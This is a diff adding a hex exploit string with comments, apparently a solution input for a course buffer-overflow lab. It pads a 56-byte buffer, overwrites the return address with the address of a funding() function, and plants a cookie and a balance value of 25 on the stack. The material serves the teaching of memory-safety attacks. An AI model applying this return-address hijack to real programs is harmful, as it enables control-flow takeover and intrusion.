@@ -1,0 +1,12 @@
+00 00 00 00 00 00 00 00 	/* fill in buffer */
+00 00 00 00 00 00 00 00 	
+00 00 00 00 00 00 00 00 	/* continue filling... */
+00 00 00 00 00 00 00 00 	
+00 00 00 00 00 00 00 00 	/* continue filling... */
+00 00 00 00 00 00 00 00 	
+00 00 00 00 00 00 00 00 	/* continue up to 56 bytes */
+5c 10 40 00 00 00 00 00 	/* put memory location of funding() in rtn adr */
+00 00 00 00 00 00 00 00 
+7a 14 1b 5c 00 00 00 00 	/* put my cookie on the stack; 16 above return address */
+00 00 00 00 00 00 00 00
+19 00 00 00 00 00 00 00 	/* make value of balance 25; 32 above return address */
